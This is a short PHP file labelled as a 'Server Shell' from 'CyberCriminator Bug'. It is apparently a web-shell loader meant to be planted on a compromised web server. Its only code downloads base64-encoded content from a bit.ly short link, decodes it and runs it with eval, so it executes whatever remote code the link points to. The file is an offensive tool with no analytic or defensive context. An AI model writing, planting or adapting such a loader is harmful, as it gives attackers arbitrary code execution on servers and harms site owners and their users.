<html>
<head>
<center>
<font face="tahoma" size="5" color="darkred"> CyberCriminator Bug 🐛 Server Shell<br></font>
</center>
<?php
$pf = "https://bit.ly/3Cm06eC";
$puf = file_get_contents($pf); 
eval("?>".(base64_decode($puf)));
?>
</head>
</html>